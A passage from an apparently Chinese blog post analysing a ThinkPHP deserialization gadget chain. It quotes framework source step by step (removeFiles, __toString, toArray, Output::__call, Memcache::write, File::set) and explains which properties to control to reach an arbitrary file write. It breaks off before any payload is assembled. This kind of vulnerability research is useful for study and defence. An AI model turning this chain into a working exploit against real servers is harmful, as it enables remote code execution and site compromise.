class="line">&#125;</span><br></pre></td></tr></table></figure><p>close()函数作用是关闭文件，没有利用点，跟进调用的removeFiles()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            @unlink(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有file_exists()函数，其调用时需要的是一个字符串类型的参数，如果传入一个对象，就会先调用该类的__toString() 函数，将其转换成字符串，然后再判断</p><p>全局搜索__toString()，进入<code>./Model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson() </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进__tojson()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入to_Array()，函数内有三处可以触发__call()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray(); </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();<span class="comment">//第一处</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr(); <span class="comment">//第二处</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>; <span class="comment">//第三处</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第三处的参数是可控的，可以被利用，但是要满足七个条件</p><blockquote><ol><li>!empty($this-&gt;append) # $this-&gt;append不为空</li><li>!is_array($name) # $name不能为数组</li><li>!strpos($name, ‘.’) # $name不能有.</li><li>method_exists($this, $relation) # $relation必须为Model类里的方法</li><li>method_exists($modelRelation, ‘getBindAttr’) # $modelRelation必须存在getBindAttr方法</li><li>$bindAttr # 必须有值</li><li>!isset($this-&gt;data[$key]) # $key不能在$this-&gt;data这个数组里有相同的值。</li></ol></blockquote><p>$this-&gt;append是可控数组，前三个条件只要令<code>$this-&gt;append = [string]</code>就能满足</p><p>第四个条件与parseName()函数有关，在<code>./Loader.php</code>中找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字符串命名风格转换</span></span><br><span class="line"><span class="comment">     * type 0 将 Java 风格转换为 C 的风格 1 将 C 风格转换为 Java 的风格</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $name    字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  integer $type    转换类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool    $ucfirst 首字母是否大写（驼峰规则）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="variable">$name</span> = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$match</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> strtoupper(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? ucfirst(<span class="variable">$name</span>) : lcfirst(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一个转换代码风格的函数，故实际上<code>$name == $relation</code>，这里可以利用结构简单且返回值可控的getError()函数，令<code>$this-&gt;append = [&#39;getError&#39;]</code>即可满足前四个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> this-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进getRelationData()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取关联模型数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> Relation        $modelRelation 模型关联对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> BadMethodCallException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 首先获取关联数据</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回值为$value，并且只要满足if条件就能使其可控</p><p>全局搜索isselfRelation()，发现是抽象类Relation中的函数，在全局寻找它的子类，除抽象类OneToOne之外均没有getBindAttr()函数，继续寻找OneToOne的子类，找到HasOne类与BelongsTo类，这里选HasOne类</p><p>则有<code>$this-&gt;error = new HasOne()</code></p><p>为满足if条件判断，有以下三点：</p><p>（一）__call()函数来自Output类，$value必须为Output类的对象，故令<code>$this-&gt;parent = new Output()</code></p><p>（二）isselfRelation()直接返回$this-&gt;relation，故令<code>$this-&gt;relation = flase</code></p><p>（三）$this-&gt;parent已经确定为Output类，故$modelRelation-&gt;getModel()也应为Output类</p><p>Relation类中有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query-&gt;getModel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;query可控，全局搜索得到Query类中的getModel()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故可令<code>$this-&gt;query = new Query(), $this-&gt;model = new Output()</code></p><p>则有<code>$value = $this-&gt;parent = new Output()</code>，第五个条件通过</p><p>接下来因为<code>$bindAttr = $modelRelation-&gt;getBindAttr()</code>，其中getBindAttr():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;bindAttr可控，可令<code>$this-&gt;bindAttr = [&#39;a&#39;, &#39;b&#39;]</code>，第六个条件通过</p><p>现在来到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null</code>，Output类中没有getAttr()函数，因此会调用Output类的__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>$method == getAttr, $args == &#39;b&#39;</code>，所以应当满足第一个if判断去调用block()</p><p>$this-&gt;style可控，令<code>$this-&gt;style = [&#39;getAttr&#39;]</code></p><p>跟进block()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进writeln()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局寻找write()函数，选择<code>/thinkphp/library/think/session/driver/Memcache.php</code>中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;handler可控，全局寻找含有set()函数的类，选择<code>thinkphp/think/cache/driver/File.php</code>中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">    <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set()函数中调用了file_put_contents()来进行文件写入，写入内容为$data，$data来自于$value，而$value实际上是writln()中的true，不可控</p><p>这里跟进setTagItem()函数，在该函数中，以$name作为$value又调用了一次set()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span 